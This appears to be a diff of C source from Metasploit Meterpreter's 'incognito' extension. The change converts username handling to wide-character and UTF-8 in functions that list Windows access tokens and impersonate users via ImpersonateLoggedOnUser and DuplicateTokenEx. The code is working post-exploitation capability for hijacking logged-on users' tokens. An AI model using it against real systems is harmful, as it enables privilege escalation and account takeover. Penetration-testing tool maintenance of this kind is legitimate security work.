@@ -1,5 +1,5 @@
 /*
- * This module implements token manipulation features 
+ * This module implements token manipulation features
  */
 #define _CRT_SECURE_NO_DEPRECATE 1
 #include "../../common/common.h"
@@ -11,7 +11,7 @@
 #include "hash_stealer.h"
 #include "../../DelayLoadMetSrv/DelayLoadMetSrv.h"
 // include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
-// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
+// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the
 // second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
 #include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
 
@@ -21,14 +21,6 @@ EnableDelayLoadMetSrv();
 DWORD request_incognito_list_tokens(Remote *remote, Packet *packet);
 DWORD request_incognito_impersonate_user(Remote *remote, Packet *packet);
 
-static int compare_token_names(const unique_user_token *a, const unique_user_token *b);
-
-
-static int compare_token_names(const unique_user_token *a, const unique_user_token *b)
-{
-	return _stricmp(a->username, b->username);
-}
-
 DWORD request_incognito_list_tokens(Remote *remote, Packet *packet)
 {
 	DWORD num_unique_tokens = 0, num_tokens = 0, i;
@@ -37,9 +29,8 @@ DWORD request_incognito_list_tokens(Remote *remote, Packet *packet)
 	BOOL bTokensAvailable = FALSE;
 	TOKEN_ORDER token_order;
 	TOKEN_PRIVS token_privs;
-	char *delegation_tokens = calloc(sizeof(char), BUF_SIZE),
-		*impersonation_tokens = calloc(sizeof(char), BUF_SIZE),
-		temp[BUF_SIZE] = "";
+	char *delegation_tokens = calloc(sizeof(char), BUF_SIZE);
+	char *impersonation_tokens = calloc(sizeof(char), BUF_SIZE);
 
 	Packet *response = packet_create_response(packet);
 	token_order = packet_get_tlv_value_uint(packet, TLV_TYPE_INCOGNITO_LIST_TOKENS_TOKEN_ORDER);
@@ -81,8 +72,12 @@ DWORD request_incognito_list_tokens(Remote *remote, Packet *packet)
 	if (uniq_tokens[i].delegation_available)
 	{
 		bTokensAvailable = TRUE;
-		strncat(delegation_tokens, uniq_tokens[i].username, BUF_SIZE - strlen(delegation_tokens) - 1);
-		strncat(delegation_tokens, "\n", BUF_SIZE - strlen(delegation_tokens) - 1);
+		char *username = wchar_to_utf8(uniq_tokens[i].username);
+		if (username) {
+			strncat(delegation_tokens, username, BUF_SIZE - strlen(delegation_tokens) - 1);
+			strncat(delegation_tokens, "\n", BUF_SIZE - strlen(delegation_tokens) - 1);
+			free(username);
+		}
 	}
 
 	if (!bTokensAvailable)
@@ -97,8 +92,12 @@ DWORD request_incognito_list_tokens(Remote *remote, Packet *packet)
 		if (!uniq_tokens[i].delegation_available && uniq_tokens[i].impersonation_available)
 		{
 			bTokensAvailable = TRUE;
-			strncat(impersonation_tokens, uniq_tokens[i].username, BUF_SIZE - strlen(impersonation_tokens) - 1);
-			strncat(impersonation_tokens, "\n", BUF_SIZE - strlen(impersonation_tokens) - 1);
+			char *username = wchar_to_utf8(uniq_tokens[i].username);
+			if (username) {
+				strncat(impersonation_tokens, username, BUF_SIZE - strlen(impersonation_tokens) - 1);
+				strncat(impersonation_tokens, "\n", BUF_SIZE - strlen(impersonation_tokens) - 1);
+				free(username);
+			}
 		}
 	}
 
@@ -125,19 +124,19 @@ DWORD request_incognito_impersonate_token(Remote *remote, Packet *packet)
 	unique_user_token *uniq_tokens = calloc(BUF_SIZE, sizeof(unique_user_token));
 	SavedToken *token_list = NULL;
 	BOOL bTokensAvailable = FALSE, delegation_available = FALSE;
-	char temp[BUF_SIZE] = "", *requested_username, return_value[BUF_SIZE] = "";
+	char return_value[BUF_SIZE] = "";
 	HANDLE xtoken;
 	TOKEN_PRIVS token_privs;
 
 	Packet *response = packet_create_response(packet);
-	requested_username = packet_get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_IMPERSONATE_TOKEN);
-	
+	char *impersonate_token = packet_get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_IMPERSONATE_TOKEN);
+	wchar_t *requested_username = utf8_to_wchar(impersonate_token);
+
 	// Enumerate tokens
 	token_list = get_token_list(&num_tokens, &token_privs);
 
 	if (!token_list)
 	{
-		sprintf(temp, "[-] Failed to enumerate tokens with error code: %d\n", GetLastError());
 		goto cleanup;
 	}
 
@@ -151,7 +150,7 @@ DWORD request_incognito_impersonate_token(Remote *remote, Packet *packet)
 
 	for (i=0;i<num_unique_tokens;i++)
 	{
-		if (!_stricmp(uniq_tokens[i].username, requested_username) )//&& uniq_tokens[i].impersonation_available)
+		if (!_wcsicmp(uniq_tokens[i].username, requested_username)) //&& uniq_tokens[i].impersonation_available)
 		{
 			if (uniq_tokens[i].delegation_available)
 				delegation_available = TRUE;
@@ -165,25 +164,29 @@ DWORD request_incognito_impersonate_token(Remote *remote, Packet *packet)
 				if (is_token(token_list[i].token, requested_username))
 				if (ImpersonateLoggedOnUser(token_list[i].token))
 				{
-					strncat(return_value, "[+] Successfully impersonated user ", sizeof(return_value)-strlen(return_value)-1);
-					strncat(return_value, token_list[i].username, sizeof(return_value)-strlen(return_value)-1);
-					strncat(return_value, "\n", sizeof(return_value)-strlen(return_value)-1);
-				
-					if (!DuplicateTokenEx(token_list[i].token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &xtoken)) {
-						dprintf("[INCOGNITO] Failed to duplicate token for %s (%u)", token_list[i].username, GetLastError());
-					} else {
-						core_update_thread_token(remote, xtoken);
+					char *username = wchar_to_utf8(token_list[i].username);
+					if (username) {
+						strncat(return_value, "[+] Successfully impersonated user ", sizeof(return_value)-strlen(return_value)-1);
+						strncat(return_value, username, sizeof(return_value)-strlen(return_value)-1);
+						strncat(return_value, "\n", sizeof(return_value)-strlen(return_value)-1);
+
+						if (!DuplicateTokenEx(token_list[i].token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &xtoken)) {
+							dprintf("[INCOGNITO] Failed to duplicate token for %s (%u)", username, GetLastError());
+						} else {
+							core_update_thread_token(remote, xtoken);
+						}
+						free(username);
 					}
 					goto cleanup;
 				}
 			}
 		}
 	}
-	
+
 	strncat(return_value, "[-] User token ", sizeof(return_value)-strlen(return_value)-1);
-	strncat(return_value, requested_username, sizeof(return_value)-strlen(return_value)-1);
+	strncat(return_value, impersonate_token, sizeof(return_value)-strlen(return_value)-1);
 	strncat(return_value, " not found\n", sizeof(return_value)-strlen(return_value)-1);
-	
+
 cleanup:
 	for (i=0;i<num_tokens;i++)
 		CloseHandle(token_list[i].token);
@@ -192,7 +195,7 @@ cleanup:
 
 	packet_add_tlv_string(response, TLV_TYPE_INCOGNITO_GENERIC_RESPONSE, return_value);
 	packet_transmit_response(ERROR_SUCCESS, remote, response);
-	
+
 	return ERROR_SUCCESS;
 }
 
